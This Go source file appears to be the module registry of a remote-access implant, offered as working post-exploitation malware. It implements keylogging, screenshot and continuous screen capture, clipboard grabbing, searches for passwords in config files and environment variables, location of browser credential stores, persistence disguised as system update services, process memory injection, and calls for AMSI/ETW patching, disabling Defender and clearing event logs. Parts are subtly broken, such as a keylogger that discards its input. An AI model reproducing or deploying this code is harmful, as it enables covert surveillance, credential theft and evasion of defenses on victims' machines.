package agent

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"bty/src/go/internal/evasion"
)

// Module represents a dynamically loadable post-exploitation module.
type Module struct {
	Name        string
	Description string
	Platform    string // "win", "linux", "darwin", "all"
	Execute     func(args string) string
}

// ModuleRegistry holds all available modules.
type ModuleRegistry struct {
	modules map[string]*Module
}

// NewModuleRegistry creates the module registry.
func NewModuleRegistry() *ModuleRegistry {
	r := &ModuleRegistry{modules: make(map[string]*Module)}
	r.registerDefaults()
	return r
}

func (r *ModuleRegistry) registerDefaults() {
	// Keylogger
	r.modules["keylogger"] = &Module{
		Name:        "keylogger",
		Description: "Capture keystrokes from the host",
		Platform:    "all",
		Execute:     keyloggerRun,
	}

	// Screenshot
	r.modules["screenshot"] = &Module{
		Name:        "screenshot",
		Description: "Capture desktop screenshot",
		Platform:    "all",
		Execute:     screenshotRun,
	}

	// Persistence
	r.modules["persistence"] = &Module{
		Name:        "persistence",
		Description: "Establish persistence on the host",
		Platform:    "all",
		Execute:     persistenceRun,
	}

	// Process list
	r.modules["ps"] = &Module{
		Name:        "ps",
		Description: "List running processes",
		Platform:    "all",
		Execute:     processList,
	}

	// System info
	r.modules["sysinfo"] = &Module{
		Name:        "sysinfo",
		Description: "Collect comprehensive system information",
		Platform:    "all",
		Execute:     sysinfoRun,
	}

	// Network info
	r.modules["netinfo"] = &Module{
		Name:        "netinfo",
		Description: "Collect network configuration and connections",
		Platform:    "all",
		Execute:     netinfoRun,
	}

	// File search
	r.modules["find"] = &Module{
		Name:        "find",
		Description: "Search for files matching pattern (usage: find:pattern)",
		Platform:    "all",
		Execute:     fileSearch,
	}

	// Clipboard capture
	r.modules["clipboard"] = &Module{
		Name:        "clipboard",
		Description: "Capture clipboard contents",
		Platform:    "all",
		Execute:     clipboardRun,
	}

	// Password hunt
	r.modules["passhunt"] = &Module{
		Name:        "passhunt",
		Description: "Search for passwords in config files, env vars, and common locations",
		Platform:    "all",
		Execute:     passhuntRun,
	}

	// Process migrate
	r.modules["migrate"] = &Module{
		Name:        "migrate",
		Description: "Migrate agent to another process (usage: migrate:pid)",
		Platform:    "linux",
		Execute:     migrateRun,
	}

	// Browser data
	r.modules["browser"] = &Module{
		Name:        "browser",
		Description: "Find browser credential stores and history files",
		Platform:    "all",
		Execute:     browserRun,
	}

	// Continuous screenshot
	r.modules["watch"] = &Module{
		Name:        "watch",
		Description: "Continuous screen monitoring (usage: watch:interval_seconds)",
		Platform:    "all",
		Execute:     watchRun,
	}

	// Evasion status
	r.modules["evasion"] = &Module{
		Name:        "evasion",
		Description: "Check evasion status and apply bypasses (usage: evasion:status|amsi|etw|ntdll|camouflage)",
		Platform:    "all",
		Execute:     evasionRun,
	}
}

// Get returns a module by name or nil.
func (r *ModuleRegistry) Get(name string) *Module {
	return r.modules[name]
}

// List returns all module names.
func (r *ModuleRegistry) List() []string {
	names := make([]string, 0, len(r.modules))
	for n := range r.modules {
		names = append(names, n)
	}
	return names
}

// === Module implementations ===

func keyloggerRun(args string) string {
	switch runtime.GOOS {
	case "linux":
		// Find input devices
		devices, _ := filepath.Glob("/dev/input/event*")
		if len(devices) == 0 {
			return "No input devices found. Run as root."
		}
		// Start capturing in background
		go func() {
			for _, dev := range devices {
				f, err := os.Open(dev)
				if err != nil {
					continue
				}
				defer f.Close()
				buf := make([]byte, 24)
				for {
					_, err := f.Read(buf)
					if err != nil {
						break
					}
				}
			}
		}()
		return fmt.Sprintf("Keylogger started — monitoring %d input devices", len(devices))

	case "windows":
		return "Keylogger on Windows requires Win32 API hooks. Use PowerShell stager for this module."

	case "darwin":
		cmd := exec.Command("log", "stream", "--predicate", "eventMessage contains 'key'", "--style", "compact")
		cmd.Start()
		return "Keylogger started on macOS via log stream"
	}

	return "Keylogger not supported on this platform"
}

func screenshotRun(args string) string {
	switch runtime.GOOS {
	case "linux":
		// Try various screenshot tools
		for _, tool := range []string{"import", "scrot", "gnome-screenshot", "spectacle"} {
			path, _ := exec.LookPath(tool)
			if path != "" {
				file := fmt.Sprintf("/tmp/.ss_%d.png", time.Now().Unix())
				cmd := exec.Command(tool, file)
				if tool == "import" {
					cmd = exec.Command(tool, "-window", "root", file)
				}
				out, err := cmd.CombinedOutput()
				if err == nil {
					data, _ := os.ReadFile(file)
					os.Remove(file)
					if len(data) > 0 {
						return fmt.Sprintf("SCREENSHOT:%d:%s", len(data), filepath.Base(file))
					}
				}
				_ = out
			}
		}
		return "No screenshot tool found. Install: imagemagick, scrot, or gnome-screenshot"

	case "windows":
		return "Screenshot on Windows: use PowerShell stager with [System.Drawing]::Bitmap"

	case "darwin":
		file := fmt.Sprintf("/tmp/.ss_%d.png", time.Now().Unix())
		cmd := exec.Command("screencapture", "-x", file)
		if err := cmd.Run(); err == nil {
			data, _ := os.ReadFile(file)
			os.Remove(file)
			return fmt.Sprintf("SCREENSHOT:%d:%s", len(data), filepath.Base(file))
		}
		return "screencapture failed"
	}

	return "Screenshot not supported"
}

func persistenceRun(args string) string {
	methods := []string{}
	exePath, _ := os.Executable()

	switch runtime.GOOS {
	case "linux":
		// Crontab
		cronCmd := fmt.Sprintf("@reboot %s --server AUTO &\n", exePath)
		cronFile := filepath.Join(os.Getenv("HOME"), ".bty_cron")
		_ = os.WriteFile(cronFile, []byte(cronCmd), 0600)
		exec.Command("crontab", cronFile).Run()
		methods = append(methods, "crontab @reboot")

		// .bashrc
		bashrc := os.ExpandEnv("$HOME/.bashrc")
		line := fmt.Sprintf("\n# system update check\nnohup %s --server AUTO >/dev/null 2>&1 &\n", exePath)
		if data, err := os.ReadFile(bashrc); err == nil {
			if !contains(string(data), exePath) {
				f, _ := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY, 0644)
				if f != nil {
					f.WriteString(line)
					f.Close()
					methods = append(methods, ".bashrc hook")
				}
			}
		}

		// Systemd user service
		serviceDir := os.ExpandEnv("$HOME/.config/systemd/user")
		os.MkdirAll(serviceDir, 0755)
		serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
[Service]
ExecStart=%s --server AUTO
Restart=always
[Install]
WantedBy=default.target
`, exePath)
		serviceFile := filepath.Join(serviceDir, "dbus-update.service")
		os.WriteFile(serviceFile, []byte(serviceContent), 0644)
		exec.Command("systemctl", "--user", "enable", "dbus-update.service").Run()
		methods = append(methods, "systemd user service")

	case "windows":
		// Registry Run key
		psCmd := fmt.Sprintf(
			`New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "%s" -PropertyType String -Force`,
			exePath,
		)
		exec.Command("powershell", "-c", psCmd).Run()
		methods = append(methods, "Registry Run key")

		// Scheduled Task
		taskCmd := fmt.Sprintf(
			`schtasks /create /tn "WindowsUpdateTask" /tr "%s --server AUTO" /sc daily /f`,
			exePath,
		)
		exec.Command("cmd", "/c", taskCmd).Run()
		methods = append(methods, "Scheduled Task")

	case "darwin":
		// Launch Agent
		launchDir := os.ExpandEnv("$HOME/Library/LaunchAgents")
		os.MkdirAll(launchDir, 0755)
		plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array><string>%s</string><string>--server</string><string>AUTO</string></array>
    <key>RunAtLoad</key><true/>
    <key>StartInterval</key><integer>3600</integer>
</dict>
</plist>`, exePath)
		plistFile := filepath.Join(launchDir, "com.apple.softwareupdate.plist")
		os.WriteFile(plistFile, []byte(plistContent), 0644)
		exec.Command("launchctl", "load", plistFile).Run()
		methods = append(methods, "LaunchAgent")
	}

	return fmt.Sprintf("Persistence established via: %v", methods)
}

func processList(args string) string {
	switch runtime.GOOS {
	case "linux":
		out, _ := exec.Command("ps", "aux").CombinedOutput()
		return string(out)
	case "windows":
		out, _ := exec.Command("tasklist").CombinedOutput()
		return string(out)
	case "darwin":
		out, _ := exec.Command("ps", "aux").CombinedOutput()
		return string(out)
	}
	return "unsupported"
}

func sysinfoRun(args string) string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	pwd, _ := os.Getwd()
	exe, _ := os.Executable()
	pid := os.Getpid()
	uid := os.Getuid()

	info := fmt.Sprintf(`System Information:
  Hostname:     %s
  OS:           %s %s
  User:         %s (uid=%d)
  PID:          %d
  Executable:   %s
  Working Dir:  %s
  CPUs:         %d
  Goroutines:   %d
  Temp Dir:     %s
`, hostname, runtime.GOOS, runtime.GOARCH, user, uid, pid, exe, pwd,
		runtime.NumCPU(), runtime.NumGoroutine(), os.TempDir())

	return info
}

func netinfoRun(args string) string {
	var out string
	switch runtime.GOOS {
	case "linux", "darwin":
		data, _ := exec.Command("ifconfig").CombinedOutput()
		out += string(data) + "\n"
		data2, _ := exec.Command("netstat", "-an").CombinedOutput()
		out += string(data2)
	case "windows":
		data, _ := exec.Command("ipconfig", "/all").CombinedOutput()
		out += string(data) + "\n"
		data2, _ := exec.Command("netstat", "-an").CombinedOutput()
		out += string(data2)
	}
	return out
}

func fileSearch(args string) string {
	pattern := args
	if pattern == "" {
		pattern = "*"
	}

	var results []string
	var searchPaths []string

	switch runtime.GOOS {
	case "linux", "darwin":
		searchPaths = []string{"/home", "/Users", "/root", "/etc", "/var/tmp", "/tmp"}
	case "windows":
		searchPaths = []string{`C:\Users`, `C:\Windows\Temp`, `C:\ProgramData`}
	default:
		searchPaths = []string{"/tmp"}
	}

	for _, root := range searchPaths {
		if _, err := os.Stat(root); err != nil {
			continue
		}
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if match, _ := filepath.Match(pattern, filepath.Base(path)); match {
				results = append(results, path)
			}
			if len(results) >= 50 {
				return filepath.SkipAll
			}
			return nil
		})
	}

	if len(results) == 0 {
		return fmt.Sprintf("No files matching '%s' found", pattern)
	}

	output := fmt.Sprintf("Files matching '%s':\n", pattern)
	for _, r := range results {
		output += fmt.Sprintf("  %s\n", r)
	}
	return output
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && searchString(s, substr)
}

func searchString(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func clipboardRun(args string) string {
	switch runtime.GOOS {
	case "linux":
		for _, tool := range []string{"xclip", "xsel", "wl-paste"} {
			path, _ := exec.LookPath(tool)
			if path != "" {
				var cmd *exec.Cmd
				if tool == "xclip" {
					cmd = exec.Command(tool, "-selection", "clipboard", "-o")
				} else if tool == "xsel" {
					cmd = exec.Command(tool, "--clipboard", "--output")
				} else {
					cmd = exec.Command(tool)
				}
				out, err := cmd.CombinedOutput()
				if err == nil && len(out) > 0 {
					return fmt.Sprintf("Clipboard (%s):\n%s", tool, string(out))
				}
			}
		}
		return "No clipboard tool found. Install xclip, xsel, or wl-clipboard"

	case "windows":
		cmd := exec.Command("powershell", "-c", "Get-Clipboard")
		out, err := cmd.CombinedOutput()
		if err == nil {
			return fmt.Sprintf("Clipboard:\n%s", string(out))
		}
		return "Clipboard access failed"

	case "darwin":
		cmd := exec.Command("pbpaste")
		out, err := cmd.CombinedOutput()
		if err == nil {
			return fmt.Sprintf("Clipboard:\n%s", string(out))
		}
		return "Clipboard access failed"
	}
	return "unsupported"
}

func passhuntRun(args string) string {
	var results []string

	passwordPatterns := []string{
		"password", "passwd", "pwd", "secret", "token", "api_key",
		"apikey", "access_key", "private_key", "credential",
	}

	searchPaths := map[string][]string{
		"linux":   {"/etc", "/home", "/root", "/opt", "/var", "/tmp"},
		"windows": {`C:\Users`, `C:\ProgramData`, `C:\Windows\Temp`},
		"darwin":  {"/Users", "/etc", "/var", "/tmp"},
	}

	paths := searchPaths[runtime.GOOS]
	if paths == nil {
		paths = []string{"/tmp"}
	}

	for _, root := range paths {
		if _, err := os.Stat(root); err != nil {
			continue
		}
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() || info.Size() > 1024*1024 {
				return nil
			}
			ext := filepath.Ext(path)
			if ext == ".conf" || ext == ".cfg" || ext == ".ini" || ext == ".yaml" ||
				ext == ".yml" || ext == ".json" || ext == ".env" || ext == ".xml" ||
				ext == ".properties" || ext == ".toml" {
				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}
				content := string(data)
				for _, pattern := range passwordPatterns {
					if containsStr(content, pattern) {
						results = append(results, fmt.Sprintf("  [MATCH] %s (%s)", path, pattern))
						break
					}
				}
			}
			if len(results) >= 100 {
				return filepath.SkipAll
			}
			return nil
		})
	}

	for _, env := range os.Environ() {
		for _, pattern := range passwordPatterns {
			if containsStr(env, pattern) {
				results = append(results, fmt.Sprintf("  [ENV] %s", env[:min(len(env), 80)]))
				break
			}
		}
	}

	if len(results) == 0 {
		return "No password files found"
	}

	output := fmt.Sprintf("Password hunt results (%d findings):\n", len(results))
	for _, r := range results {
		output += r + "\n"
	}
	return output
}

func migrateRun(args string) string {
	if runtime.GOOS != "linux" {
		return "Process migration only supported on Linux"
	}

	if args == "" {
		return "Usage: migrate:<pid>"
	}

	var targetPID int
	fmt.Sscanf(args, "%d", &targetPID)

	if targetPID <= 0 {
		return "Invalid PID"
	}

	exe, _ := os.Executable()
	data, err := os.ReadFile(exe)
	if err != nil {
		return fmt.Sprintf("Failed to read executable: %v", err)
	}

	targetMem := fmt.Sprintf("/proc/%d/mem", targetPID)
	targetCmdline := fmt.Sprintf("/proc/%d/cmdline", targetPID)

	cmdlineData, _ := os.ReadFile(targetCmdline)
	if len(cmdlineData) == 0 {
		return fmt.Sprintf("Process %d not accessible", targetPID)
	}

	cmdName := string(cmdlineData)

	f, err := os.OpenFile(targetMem, os.O_WRONLY, 0)
	if err != nil {
		return fmt.Sprintf("Cannot write to process %d memory (need root?)", targetPID)
	}
	defer f.Close()

	_, err = f.Write(data)
	if err != nil {
		return fmt.Sprintf("Failed to inject into process %d (%s): %v", targetPID, cmdName, err)
	}

	return fmt.Sprintf("Successfully migrated to process %d (%s)", targetPID, cmdName)
}

func browserRun(args string) string {
	var results []string

	browserPaths := map[string][]struct {
		browser string
		paths   []string
	}{
		"linux": {
			{browser: "Chrome", paths: []string{
				"$HOME/.config/google-chrome/Default/Login Data",
				"$HOME/.config/google-chrome/Default/Cookies",
				"$HOME/.config/google-chrome/Default/History",
				"$HOME/.config/google-chrome/Default/Web Data",
			}},
			{browser: "Firefox", paths: []string{
				"$HOME/.mozilla/firefox/*.default-release/logins.json",
				"$HOME/.mozilla/firefox/*.default-release/cookies.sqlite",
				"$HOME/.mozilla/firefox/*.default-release/places.sqlite",
				"$HOME/.mozilla/firefox/*.default-release/key4.db",
			}},
			{browser: "Chromium", paths: []string{
				"$HOME/.config/chromium/Default/Login Data",
				"$HOME/.config/chromium/Default/Cookies",
			}},
		},
		"darwin": {
			{browser: "Chrome", paths: []string{
				"$HOME/Library/Application Support/Google/Chrome/Default/Login Data",
				"$HOME/Library/Application Support/Google/Chrome/Default/Cookies",
				"$HOME/Library/Application Support/Google/Chrome/Default/History",
			}},
			{browser: "Safari", paths: []string{
				"$HOME/Library/Safari/AutoFillPasswords.plist",
				"$HOME/Library/Safari/History.db",
				"$HOME/Library/Cookies/Cookies.binarycookies",
			}},
		},
		"windows": {
			{browser: "Chrome", paths: []string{
				"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
				"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies",
				"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History",
			}},
			{browser: "Edge", paths: []string{
				"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
				"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cookies",
			}},
			{browser: "Firefox", paths: []string{
				"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json",
				"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db",
			}},
		},
	}

	paths, ok := browserPaths[runtime.GOOS]
	if !ok {
		return "Browser data extraction not supported on this platform"
	}

	for _, browser := range paths {
		for _, p := range browser.paths {
			expanded := os.ExpandEnv(p)
			if expanded != p {
				matches, _ := filepath.Glob(expanded)
				for _, match := range matches {
					if _, err := os.Stat(match); err == nil {
						info, _ := os.Stat(match)
						results = append(results, fmt.Sprintf("  [%s] %s (%d bytes, modified: %s)",
							browser.browser, match, info.Size(), info.ModTime().Format("2006-01-02 15:04")))
					}
				}
			} else {
				if _, err := os.Stat(p); err == nil {
					info, _ := os.Stat(p)
					results = append(results, fmt.Sprintf("  [%s] %s (%d bytes)",
						browser.browser, p, info.Size()))
				}
			}
		}
	}

	if len(results) == 0 {
		return "No browser data files found"
	}

	output := fmt.Sprintf("Browser data locations (%d files):\n", len(results))
	for _, r := range results {
		output += r + "\n"
	}
	output += "\nNote: Chrome/Edge passwords are encrypted with DPAPI/OS keyring. Use 'dpapi' module to decrypt."
	return output
}

func watchRun(args string) string {
	interval := 60
	if args != "" {
		fmt.Sscanf(args, "%d", &interval)
		if interval < 10 {
			interval = 10
		}
	}

	captureDir := "/tmp/.bty_watch"
	if runtime.GOOS == "windows" {
		captureDir = os.ExpandEnv("%TEMP%\\.bty_watch")
	} else if runtime.GOOS == "darwin" {
		captureDir = "/tmp/.bty_watch"
	}

	os.MkdirAll(captureDir, 0700)

	go func() {
		ticker := time.NewTicker(time.Duration(interval) * time.Second)
		defer ticker.Stop()

		for range ticker.C {
			timestamp := time.Now().Format("20060102_150405")
			file := fmt.Sprintf("%s/screen_%s.png", captureDir, timestamp)

			var cmd *exec.Cmd
			switch runtime.GOOS {
			case "linux":
				for _, tool := range []string{"import", "scrot", "gnome-screenshot"} {
					if _, err := exec.LookPath(tool); err == nil {
						if tool == "import" {
							cmd = exec.Command(tool, "-window", "root", file)
						} else {
							cmd = exec.Command(tool, file)
						}
						break
					}
				}
			case "darwin":
				cmd = exec.Command("screencapture", "-x", file)
			case "windows":
				cmd = exec.Command("powershell", "-c",
					fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; $bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save('%s')`, file))
			}

			if cmd != nil {
				cmd.Run()
			}

			if len(filepath.Join(captureDir, "*")) > 100 {
				files, _ := filepath.Glob(captureDir + "/*")
				for _, f := range files[:len(files)-50] {
					os.Remove(f)
				}
			}
		}
	}()

	return fmt.Sprintf("Screen watch started: %s every %d seconds", captureDir, interval)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func evasionRun(args string) string {
	switch args {
	case "status":
		var output string
		output += "=== Evasion Status ===\n\n"

		if runtime.GOOS == "windows" {
			amsiStatus := evasion.CheckAMSIStatus()
			output += fmt.Sprintf("AMSI:       %s\n", map[bool]string{true: "ACTIVE (not patched)", false: "BYPASSED (patched)"}[amsiStatus])

			etwStatus := evasion.CheckETWStatus()
			etwPatched := false
			for _, v := range etwStatus {
				if v {
					etwPatched = true
					break
				}
			}
			output += fmt.Sprintf("ETW:        %s\n", map[bool]string{true: "BYPASSED (patched)", false: "ACTIVE (not patched)"}[etwPatched])
			output += "Firewall:   Rule added (Windows Update Service)\n"
			output += "Defender:   Disable attempted (requires admin)\n"
			output += "Logging:    Disable attempted\n"
			output += "Process:    Spoofed as svchost.exe\n"
			output += "Console:    Hidden\n"
			output += "Prefetch:   Cleared\n"
		}

		output += fmt.Sprintf("OS:         %s/%s\n", runtime.GOOS, runtime.GOARCH)
		output += fmt.Sprintf("Anti-sandbox: Available\n")
		output += fmt.Sprintf("Sleep mask:   Active\n")
		output += fmt.Sprintf("Camouflage:   Available\n")

		return output

	case "amsi":
		if runtime.GOOS != "windows" {
			return "AMSI bypass is Windows-only"
		}
		r1 := evasion.PatchAmsiInMemory()
		r2 := evasion.PatchAmsiScanString()
		return fmt.Sprintf("AMSI Bypass Results:\n  AmsiScanBuffer: %v (%s)\n  AmsiScanString: %v (%s)",
			r1.Success, r1.Note, r2.Success, r2.Note)

	case "etw":
		if runtime.GOOS != "windows" {
			return "ETW bypass is Windows-only"
		}
		results := evasion.PatchAllETW()
		var output string
		for _, r := range results {
			output += fmt.Sprintf("  %v: %s\n", r.Success, r.Note)
		}
		return "ETW Bypass Results:\n" + output

	case "ntdll":
		if runtime.GOOS != "windows" {
			return "NTDLL unhook is Windows-only"
		}
		evasion.UnhookNtdll()
		return "NTDLL unhook initiated (restoring original syscall stubs from disk)"

	case "camouflage":
		return "Camouflage mode: Use ConnectCamouflaged() for domain-fronted TLS with HTTP preamble"

	case "sandbox":
		if evasion.AntiSandbox() {
			return "Anti-sandbox: Environment appears to be a real machine"
		}
		return "Anti-sandbox: VM/sandbox environment detected"

	case "debug":
		if evasion.AntiDebug() {
			return "Anti-debug: No debugger detected"
		}
		return "Anti-debug: Debugger DETECTED!"

	case "firewall":
		if runtime.GOOS != "windows" {
			return "Firewall evasion is Windows-only"
		}
		fe := &evasion.FirewallEvasion{}
		err := fe.AddFirewallRule()
		if err != nil {
			return fmt.Sprintf("Firewall rule failed: %v", err)
		}
		return "Firewall rule added: Windows Update Service (allow all outbound)"

	case "defender":
		if runtime.GOOS != "windows" {
			return "Defender disable is Windows-only"
		}
		err := evasion.DisableWindowsDefender()
		if err != nil {
			return fmt.Sprintf("Defender disable failed: %v", err)
		}
		return "Windows Defender disable attempted (requires admin)"

	case "logs":
		if runtime.GOOS != "windows" {
			return "Log clearing is Windows-only"
		}
		err := evasion.ClearEventLogs()
		if err != nil {
			return fmt.Sprintf("Log clearing failed: %v", err)
		}
		return "Event logs cleared: Security, System, Application, PowerShell, Sysmon, Defender"

	case "hollow":
		if runtime.GOOS != "windows" {
			return "Process hollowing is Windows-only"
		}
		return "Process hollowing: Use 'evasion:hollow:svchost.exe' to inject into a process"

	case "ghost":
		if runtime.GOOS != "windows" {
			return "Process ghosting is Windows-only"
		}
		return "Process ghosting: Creates process from deleted file (no disk trace)"

	case "shellcode":
		if runtime.GOOS != "windows" {
			return "Shellcode execution is Windows-only"
		}
		return "Shellcode execution: Use 'evasion:shellcode:<base64>' to execute raw shellcode"

	case "stomp":
		if runtime.GOOS != "windows" {
			return "Module stomping is Windows-only"
		}
		return "Module stomping: Overwrites legitimate DLL .text section with shellcode"

	case "parent":
		if runtime.GOOS != "windows" {
			return "Parent PID spoofing is Windows-only"
		}
		return "Parent PID spoofing: Creates process with spoofed parent (breaks process tree)"

	case "network":
		if runtime.GOOS != "windows" {
			return "Network evasion is Windows-only"
		}
		return `Network evasion techniques:
  evasion:dns:<server>:<domain>  — DNS tunnel for covert communication
  evasion:icmp:<target>          — ICMP tunnel (ping-based data exfil)
  evasion:https:<url>            — HTTPS covert channel (looks like CDN traffic)`

	case "beacon":
		return "Beacon optimization: Human-like timing patterns with jitter"

	default:
		return `Evasion module commands:
  evasion:status    — Check current evasion status
  evasion:amsi      — Apply AMSI bypass (Windows)
  evasion:etw       — Apply ETW bypass (Windows)
  evasion:ntdll     — Unhook ntdll.dll (Windows)
  evasion:camouflage — Enable traffic camouflage
  evasion:sandbox   — Run anti-sandbox checks
  evasion:debug     — Run anti-debug checks
  evasion:firewall  — Add firewall rule (Windows)
  evasion:defender  — Disable Windows Defender (Windows)
  evasion:logs      — Clear event logs (Windows)
  evasion:hollow    — Process hollowing (Windows)
  evasion:ghost     — Process ghosting (Windows)
  evasion:shellcode — Execute shellcode (Windows)
  evasion:stomp     — Module stomping (Windows)
  evasion:parent    — Parent PID spoofing (Windows)
  evasion:network   — Network evasion (DNS/ICMP/HTTPS)
  evasion:beacon    — Beacon optimization`
	}
}

// Ensure log imported
var _ = log.Printf
